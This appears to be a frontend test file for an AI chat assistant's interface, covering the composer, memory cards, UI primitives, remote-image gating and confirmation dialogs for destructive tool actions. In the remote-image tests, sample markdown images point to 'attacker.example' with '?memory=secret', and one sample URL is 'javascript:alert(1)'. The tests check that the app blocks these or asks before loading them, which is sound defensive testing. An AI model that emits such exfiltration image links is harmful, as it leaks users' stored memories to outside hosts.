// ─────────────────────────────────────────────────────────────────────────────

describe('Composer', () => {
  it('sends on Enter, not on Shift+Enter, and reports the draft', () => {
    const onSend = vi.fn();
    const onDraftChange = vi.fn();
    wrap(<Composer onSend={onSend} onDraftChange={onDraftChange} />);
    const ta = screen.getByRole('textbox');
    fireEvent.change(ta, { target: { value: 'Hello' } });
    expect(onDraftChange).toHaveBeenLastCalledWith('Hello');
    fireEvent.keyDown(ta, { key: 'Enter', shiftKey: true });
    expect(onSend).not.toHaveBeenCalled();
    fireEvent.keyDown(ta, { key: 'Enter' });
    expect(onSend).toHaveBeenCalledWith('Hello', []);
    expect(onDraftChange).toHaveBeenLastCalledWith('');
  });

  it('does not send empty text', () => {
    const onSend = vi.fn();
    wrap(<Composer onSend={onSend} />);
    fireEvent.keyDown(screen.getByRole('textbox'), { key: 'Enter' });
    expect(onSend).not.toHaveBeenCalled();
    expect((screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement).disabled).toBe(true);
  });

  it('while busy shows Stop, keeps typing enabled and does not send', () => {
    const onSend = vi.fn();
    const onCancel = vi.fn();
    wrap(<Composer onSend={onSend} onCancel={onCancel} busy />);
    const ta = screen.getByRole('textbox') as HTMLTextAreaElement;
    expect(ta.disabled).toBe(false);
    fireEvent.change(ta, { target: { value: 'next' } });
    fireEvent.keyDown(ta, { key: 'Enter' });
    expect(onSend).not.toHaveBeenCalled();
    fireEvent.click(screen.getByRole('button', { name: 'Stop generating' }));
    expect(onCancel).toHaveBeenCalled();
  });

  it('enterToSend=false inserts newlines; Cmd/Ctrl+Enter still sends', () => {
    const onSend = vi.fn();
    wrap(<Composer onSend={onSend} enterToSend={false} />);
    const ta = screen.getByRole('textbox');
    fireEvent.change(ta, { target: { value: 'a' } });
    fireEvent.keyDown(ta, { key: 'Enter' });
    expect(onSend).not.toHaveBeenCalled();
    fireEvent.keyDown(ta, { key: 'Enter', metaKey: true });
    expect(onSend).toHaveBeenCalledWith('a', []);
  });

  it('exposes focus and setText through handleRef', async () => {
    const ref = createRef<ComposerHandle>();
    const onDraftChange = vi.fn();
    wrap(<Composer onSend={() => undefined} handleRef={ref} onDraftChange={onDraftChange} />);
    act(() => ref.current!.setText('Remind me to stretch'));
    expect((screen.getByRole('textbox') as HTMLTextAreaElement).value).toBe('Remind me to stretch');
    expect(onDraftChange).toHaveBeenCalledWith('Remind me to stretch');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Memory components
// ─────────────────────────────────────────────────────────────────────────────

const node: MemoryNode = {
  id: 'mem_1',
  kind: 'preference',
  label: 'Prefers window seats',
  content: 'The user prefers window seats on flights.',
  aliases: [],
  tags: [],
  importance: 0.7,
  confidence: 0.9,
  stability: 40,
  accessCount: 2,
  lastAccessedAt: null,
  createdAt: 1,
  updatedAt: 1,
  status: 'active',
  pinned: false,
  sensitivity: 'normal',
  source: { by: 'extraction' },
};

describe('MemoryGraphView', () => {
  const graph = {
    nodes: [
      { ...node, retention: 0.8 },
      { ...node, id: 'mem_2', kind: 'entity' as const, label: 'Mia', retention: 1 },
    ],
    edges: [{ id: 'edge_1', from: 'mem_1', to: 'mem_2', type: 'about' as const, weight: 0.8, createdAt: 1, updatedAt: 1, lastReinforcedAt: 1, coactivations: 0 }],
  };

  it('falls back to an accessible list without canvas and selects nodes', () => {
    const onSelect = vi.fn();
    wrap(<MemoryGraphView graph={graph} onSelect={onSelect} />);
    fireEvent.click(screen.getByRole('button', { name: /Mia/ }));
    expect(onSelect).toHaveBeenCalledWith('mem_2');
  });

  it('shows the kind legend', () => {
    wrap(<MemoryGraphView graph={graph} />);
    const legend = document.querySelector('.neo-legend')!;
    expect(legend.textContent).toContain('Entity');
    expect(legend.textContent).toContain('Preference');
  });
});

describe('MemoryNodeCard', () => {
  it('shows kind, label, content and retention', () => {
    wrap(<MemoryNodeCard node={node} retention={0.42} />);
    expect(screen.getByText('Prefers window seats')).toBeTruthy();
    expect(screen.getByText('Preference')).toBeTruthy();
    expect(screen.getAllByText('Strength 42%').length).toBeGreaterThan(0);
  });

  it('pending memories offer approve / reject', () => {
    const onApprove = vi.fn();
    const onReject = vi.fn();
    wrap(<MemoryNodeCard node={{ ...node, status: 'pending' }} onApprove={onApprove} onReject={onReject} />);
    fireEvent.click(screen.getByText('Remember'));
    fireEvent.click(screen.getByText("Don't remember"));
    expect(onApprove).toHaveBeenCalled();
    expect(onReject).toHaveBeenCalled();
  });

  it('forget asks for confirmation first', async () => {
    const onForget = vi.fn();
    const spy = vi.spyOn(window, 'confirm').mockReturnValue(true);
    wrap(<MemoryNodeCard node={node} onForget={onForget} />);
    fireEvent.click(screen.getByText('Forget'));
    await waitFor(() => expect(onForget).toHaveBeenCalled());
    spy.mockRestore();
  });

  it('archived memories can be restored; pin is a toggle', () => {
    const onRestore = vi.fn();
    const onTogglePin = vi.fn();
    wrap(<MemoryNodeCard node={{ ...node, status: 'archived', pinned: true }} onRestore={onRestore} onTogglePin={onTogglePin} />);
    fireEvent.click(screen.getByText('Restore'));
    expect(onRestore).toHaveBeenCalled();
    const pin = screen.getByRole('button', { name: 'Unpin' });
    expect(pin.getAttribute('aria-pressed')).toBe('true');
    fireEvent.click(pin);
    expect(onTogglePin).toHaveBeenCalled();
  });

  it('compact mode keeps the label', () => {
    wrap(<MemoryNodeCard node={node} compact onOpen={() => undefined} />);
    expect(screen.getByRole('button', { name: 'Prefers window seats' })).toBeTruthy();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Primitives
// ─────────────────────────────────────────────────────────────────────────────

describe('primitives', () => {
  it('SegmentedControl is a radiogroup with arrow-key navigation', () => {
    const onChange = vi.fn();
    wrap(
      <SegmentedControl
        label="Theme"
        value="light"
        onChange={onChange}
        options={[
          { value: 'light', label: 'Light' },
          { value: 'dark', label: 'Dark' },
        ]}
      />,
    );
    const light = screen.getByRole('radio', { name: 'Light' });
    expect(light.getAttribute('aria-checked')).toBe('true');
    fireEvent.keyDown(light, { key: 'ArrowRight' });
    expect(onChange).toHaveBeenCalledWith('dark');
  });

  it('Tabs expose tab roles and counts', () => {
    const onChange = vi.fn();
    wrap(<Tabs label="Memory" value="a" onChange={onChange} tabs={[{ id: 'a', label: 'Net' }, { id: 'b', label: 'Pending', count: 3 }]} />);
    expect(screen.getByRole('tab', { name: /Pending/ }).textContent).toContain('3');
    fireEvent.click(screen.getByRole('tab', { name: /Pending/ }));
    expect(onChange).toHaveBeenCalledWith('b');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Remote images (security audit NEO-19): no automatic loads from other hosts
// ─────────────────────────────────────────────────────────────────────────────

describe('remote images', () => {
  afterEach(() => {
    act(() => resetRemoteImageHosts());
  });

  it('classifies image URLs', () => {
    expect(classifyImageUrl('data:image/png;base64,abc')).toEqual({ kind: 'inline' });
    expect(classifyImageUrl(`${window.location.origin}/files/a.png`)).toEqual({ kind: 'local' });
    expect(classifyImageUrl('https://neo.example/a.png', ['https://neo.example'])).toEqual({ kind: 'local' });
    expect(classifyImageUrl('https://Attacker.example/pixel.png?memory=secret')).toEqual({ kind: 'remote', host: 'attacker.example', origin: 'https://attacker.example' });
    expect(classifyImageUrl('javascript:alert(1)')).toEqual({ kind: 'blocked' });
    expect(classifyImageUrl('//cdn.example/a.png')).toEqual({ kind: 'blocked' });
  });

  it('shows a click-to-load placeholder naming the host instead of fetching', () => {
    const { container } = wrap(<Markdown text={'![pixel](https://attacker.example/pixel.png?memory=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    const placeholder = screen.getByRole('button', { name: 'Load image from attacker.example' });
    expect(placeholder.textContent).toContain('attacker.example');
    fireEvent.click(placeholder);
    const img = container.querySelector('img')!;
    expect(img.getAttribute('src')).toBe('https://attacker.example/pixel.png?memory=secret');
    expect(img.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(isRemoteImageHostAllowed('attacker.example')).toBe(true);
  });

  it('remembers the choice per host for the session', () => {
    act(() => {
      wrap(<Markdown text={'![a](https://img.example/a.png)'} />);
    });
    fireEvent.click(screen.getByRole('button', { name: 'Load image from img.example' }));
    cleanup();
    const { container } = wrap(<Markdown text={'![b](https://img.example/b.png) ![c](https://other.example/c.png)'} />);
    expect([...container.querySelectorAll('img')].map((i) => i.getAttribute('src'))).toEqual(['https://img.example/b.png']);
    expect(screen.getByRole('button', { name: 'Load image from other.example' })).toBeTruthy();
    expect(JSON.parse(sessionStorage.getItem('neo.remote-image-hosts') ?? '[]')).toContain('img.example');
  });

  it('loads same-origin and trusted-origin images directly', () => {
    const { container } = wrap(
      <RemoteImageProvider trustedOrigins={['https://neo.example']}>
        <Markdown text={`![a](${window.location.origin}/a.png) ![b](https://neo.example/b.png)`} />
      </RemoteImageProvider>,
    );
    expect(container.querySelectorAll('img').length).toBe(2);
    expect(container.querySelector('[data-remote-image]')).toBeNull();
  });

  it('loads everything when the app enables automatic loading', () => {
    const { container } = wrap(
      <RemoteImageProvider autoLoad>
        <BlockRenderer block={{ type: 'image', url: 'https://example.com/a.png', alt: 'A picture' }} />
      </RemoteImageProvider>,
    );
    expect(container.querySelector('img')?.getAttribute('src')).toBe('https://example.com/a.png');
  });

  it('gates image, gallery, card and list item images in UI blocks', () => {
    const { container } = wrap(
      <BlockList
        blocks={[
          { type: 'image', url: 'https://a.example/1.png', alt: 'one' },
          { type: 'gallery', images: [{ url: 'https://b.example/1.png', alt: 'b1' }, { url: 'https://b.example/2.png', alt: 'b2' }, { url: 'data:image/png;base64,iVBORw0KGgo=', alt: 'inline' }] },
          { type: 'card', title: 'Card', imageUrl: 'https://c.example/1.png' },
          { type: 'list', items: [{ id: 'i1', title: 'Item', imageUrl: 'https://d.example/1.png' }] },
        ]}
      />,
    );
    expect(container.querySelectorAll('img').length).toBe(0);
    expect(screen.getByRole('button', { name: 'Load image from a.example' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Load 3 images from b.example' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Load image from c.example' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Load image from d.example' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Load 3 images from b.example' }));
    expect(container.querySelectorAll('.neo-gallery__thumb img').length).toBe(3);
  });

  it('link preview images ask inside the link without following it', () => {
    const onLink = vi.fn(() => true);
    const { container } = wrap(
      <LinkProvider onLink={onLink}>
        <BlockRenderer block={{ type: 'link', url: 'https://example.com/page', title: 'Page', imageUrl: 'https://e.example/thumb.png' }} />
      </LinkProvider>,
    );
    const link = container.querySelector('a.neo-linkcard')!;
    const placeholder = link.querySelector('[data-remote-image]') as HTMLElement;
    expect(placeholder.tagName).toBe('SPAN');
    expect(placeholder.getAttribute('aria-label')).toBe('Load image from e.example');
    fireEvent.click(placeholder);
    expect(onLink).not.toHaveBeenCalled();
    expect(link.querySelector('img')?.getAttribute('src')).toBe('https://e.example/thumb.png');
  });

  it('is translated', () => {
    wrap(<Markdown text={'![x](https://img.example/a.png)'} />, 'zh-CN');
    expect(screen.getByRole('button', { name: '从 img.example 加载图片' })).toBeTruthy();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Server-driven confirmation for UI actions (security audit NEO-16)
// ─────────────────────────────────────────────────────────────────────────────

describe('UI action confirmation (server description only)', () => {
  const serverConfirmation: UiActionConfirmation = {
    token: 'uac_tok',
    tool: 'delete_note',
    title: 'Delete note',
    description: "Delete note 'Groceries' permanently",
    risk: 'dangerous',
    expiresAt: Date.now() + 60_000,
  };

  function Asker({ confirmation: c, onResult }: { confirmation: UiActionConfirmation; onResult: (ok: boolean) => void }) {
    const ask = useUiActionConfirm();
    return (
      <button type="button" onClick={() => void ask(c).then(onResult)}>
        ask
      </button>
    );
  }

  it('builds the dialog from the server fields only', () => {
    const t = createTranslator('en', buildMessages('en'));
    expect(uiActionConfirmOptions(serverConfirmation, t)).toMatchObject({
      title: 'Delete note',
      message: "Delete note 'Groceries' permanently",
      badge: { label: 'Irreversible', tone: 'danger' },
      detail: 'delete_note',
      danger: true,
    });
    expect(uiActionConfirmOptions({ ...serverConfirmation, risk: 'write', title: '', description: '' }, t)).toMatchObject({ title: 'Delete note', message: 'Delete note', danger: false });
  });

  it('shows the risk badge and a danger button; resolves with the choice', async () => {
    const onResult = vi.fn();
    wrap(
      <ConfirmProvider>
        <Asker confirmation={serverConfirmation} onResult={onResult} />
      </ConfirmProvider>,
    );
    fireEvent.click(screen.getByText('ask'));
    const dialog = await screen.findByRole('dialog');
    expect(dialog.textContent).toContain("Delete note 'Groceries' permanently");
    expect(dialog.textContent).toContain('Irreversible');
    expect(dialog.textContent).toContain('delete_note');
    const approve = Array.from(dialog.querySelectorAll('button')).find((b) => b.textContent === 'Allow')!;
    expect(approve.className).toContain('neo-btn--danger');
    fireEvent.click(approve);
    await waitFor(() => expect(onResult).toHaveBeenCalledWith(true));

    fireEvent.click(screen.getByText('ask'));
    const again = await screen.findByRole('dialog');
    fireEvent.click(Array.from(again.querySelectorAll('button')).find((b) => b.textContent === 'Cancel')!);
    await waitFor(() => expect(onResult).toHaveBeenLastCalledWith(false));
  });
});
